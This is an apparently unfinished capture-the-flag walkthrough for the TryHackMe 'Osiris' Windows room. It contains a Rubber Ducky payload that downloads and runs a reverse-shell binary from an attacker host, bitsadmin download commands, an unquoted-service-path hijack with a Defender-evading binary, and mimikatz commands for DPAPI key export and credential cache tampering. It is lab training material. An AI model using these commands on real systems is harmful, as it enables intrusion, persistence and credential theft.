# Osiris - WIP

https://tryhackme.com/room/osiris

Rated "INSANE"

## Flag 1 - Initial Foothold

The machine won't respond to scans, but as the description says, tftp is open. This first requires that you have a tftp client, on the attack box install using `sudo apt install tftp`, then connect using `tftp <targetip>`, however first we need a script.

To exploit rubberducky, I used the script below. This uses [reverse_ssh](https://github.com/NHAS/reverse_ssh), my revshell of choice, which is typically ignored by windows defender and other protection mechanisms.

```
DELAY 1000
GUI r
DELAY 200
STRING powershell -W hidden
ENTER
DELAY 3000
STRING Invoke-WebRequest http://10.10.80.36:1234/client.exe -outfile c:\windows\temp\c.exe
ENTER
DELAY 3000
STRING c:\windows\temp\c.exe
ENTER
```

I put the above in a file named `script`, then connected over tftp and ran `put script` to put it in place. For this to work, a local webserver on port 1234 allows client.exe to be downloaded, and I got a shell connection in seconds.

On the machine as `alcrez` the first flag is in their desktop folder. 

## Flag 2 - Privesc to System

Downloading further files (e.g. obfuscated winpeas or other exploit tools) can be done with `bitsadmin.exe /transfer /Download /priority Foreground http://10.10.80.36:1234/w.exe c:\windows\temp\w.exe`, or using tftp if that floats your boat.

To privesc to system, a few things can be picked up from local enumeration:

- there is a folder at c:\scripts, that contains a vbs file and a cmd file. The vbs file seems to do nothing, but appears to relate to a local service (details next), while the cmd file downloads a zip file to c:\temp, extracts it, then force copies its contents to `c:\program files\ivpn client`.
- there is a local service named `ivpn service` that executes the ivpn client. notably this service uses an unquoted path, and so if you could get an exe named ivpn into program files or into the ivpn folder, you could hijack the service.
- the service runs as system, but as the user alcrez you have the rights to restart the service.

Presumably the vbs script that seems to do nothing triggers whatever is needed to run the extract and copy operation. This can be tested by putting any arbitary file into c:\temp, running the vbs, and observing that file is now inside the program files vpn folder. The path to privesc is thus: create a valid service binary that will give you a rev shell and avoids defender, put that in c:\temp, run the vbs script and finally restart the service to trigger the binary.

To exploit this, I used bitsadmin to download a service binary (specifically my own [unquoted](https://github.com/ChrisPritchard/unquoted)) that would run my reverse shell payload. I placed this in c:\temp with the name IVPN.exe, then ran `c:\scripts\update.vbs`. Finally I restarted the service with `restart-service -displayname "ivpn*"`.

> Note, I found this a bit finicky. Sometimes it would work, sometimes the update.vbs wouldn't trigger an update of the files (maybe due to file locks etc), or the service wouldnt start. One way to diagnose is to check with `Get-EventLog -LogName "Application" -Newest 3 -EntryType "Error" -Source ".NET Runtime" -ErrorAction SilentlyContinue | Select -ExpandProperty Message` which might print a helpful stacktrace. Otherwise, just terminating and renewing the osiris machine was the best option.

This triggered the revshell and I got a session as NT AUTHORITY/SYSTEM. The second flag was in the user chajoh's desktop folder.

## Flag 3 - DPAPI

The final flag is in a keepass database under documents for the user chajoh. This DB is set so the user can access it using their logon information (e.g. no password), which means it can't be opened unless we have an interactive session as the user chajoh.

The problem is there is no active session for chajoh to hijack, so we would need their password to login. We can extract an ntlm hash, but its unbreakable. We can force change the password using our admin session, but that would invalidate the keepass encryption meaning we would no longer be able to open the db. The intended solution is to use the ntlm hash of the user plus the domain DPAPI master key (extracted from the domain controller in prior rooms, Ra or Ra2) to generate a new key for keepass so it can be opened properly.

The steps below require mimikatz: grab this [from here](https://github.com/gentilkiwi/mimikatz/releases), extract on the attacker machine, and then use x64/mimikatz.exe in your endeavours.

Steps:

1. Get the dpapi backup key from [Ra](https://tryhackme.com/room/ra) or [Ra 2](https://tryhackme.com/room/ra2): Once getting system/admin on these machines, get and run mimikatz and then `lsadump::backupkeys /system:localhost /export`. Exfiltrate the pfx file.
2. Get mimikatz onto Osiris and replace cherjoh's password in the ntlm cache: `lsadump::cache /user:chajoh /password:NewPassword1234 /Kiwi`
3. Enable remote desktop access to the Osiris machine: `Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -value 0` and add everyone to remote desktop users: `net localgroup "Remote Desktop Users" Everyone /add`
